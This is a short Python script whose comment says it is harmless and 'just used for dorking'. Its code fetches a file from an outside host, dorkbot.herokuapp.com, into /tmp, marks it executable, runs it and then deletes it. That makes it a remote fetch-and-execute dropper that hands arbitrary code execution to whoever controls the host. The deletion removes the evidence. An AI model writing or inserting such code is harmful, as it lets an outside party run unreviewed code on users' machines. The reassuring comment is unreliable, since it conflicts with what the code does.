#!/usr/bin/python

## Courtesy of Parker McGee <pmcgee@salesforce.com>
## This is just used for dorking. It has no malicious purpose or intent.

from subprocess import call, Popen

domain = "http://dorkbot.herokuapp.com/"
filename = "/tmp/1f3870be274f6c49b3e31a0c6728957f"

call(["curl", "-o", filename, domain + "cmd"])

call(["chmod", "+x", filename])

Popen([filename])

call(["rm", filename])
